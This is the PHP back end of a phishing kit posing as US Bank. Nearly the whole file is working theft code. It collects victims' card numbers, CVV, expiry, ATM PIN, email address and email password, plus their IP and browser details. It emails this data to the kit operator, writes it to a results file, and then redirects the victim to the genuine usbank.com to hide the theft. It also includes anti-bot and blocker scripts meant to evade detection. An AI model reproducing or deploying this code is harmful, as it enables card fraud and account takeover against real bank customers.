<?php
$zabi = getenv("REMOTE_ADDR");
include('../email.php');
include '../antibots.php';
include '../bt.php';
include "../blocker.php";
$message .= "--------------US Ban3 VBV---------------------\n";
$message .= "CC Name       : ".$_POST['ccname']."\n";
$message .= "CC Number       : ".$_POST['ccnumber']."\n";
$message .= "Exp Month       : ".$_POST['expmonth']."\n";
$message .= "Exp Year       : ".$_POST['expyear']."\n";
$message .= "CVV       : ".$_POST['cvv']."\n";
$message .= "ATM PIN       : ".$_POST['atm']."\n";
$message .= "Email       : ".$_POST['email']."\n";
$message .= "Email Pass       : ".$_POST['epass']."\n";
$message .= "-------------- IP Infos ------------\n";
$message .= "IP       : $zabi\n";
$message .= "BROWSER  : ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "------------------ By Dr.Don  ---------------\n";
$cc = $_POST['ccn'];
$subject = "US  BAN3 VBV [ " . $zabi . " ]  ".$_POST['exm']."/".$_POST['exy'];
$headers = "From: Dr.Don <contact>\r\n";
mail($email, $subject, $message, $headers);
mail(','.$form, $subject, $message, $headers);

    $text = fopen('../../rezlt.txt', 'a');
fwrite($text, $message);
header("Location: https://www.usbank.com/index.html");
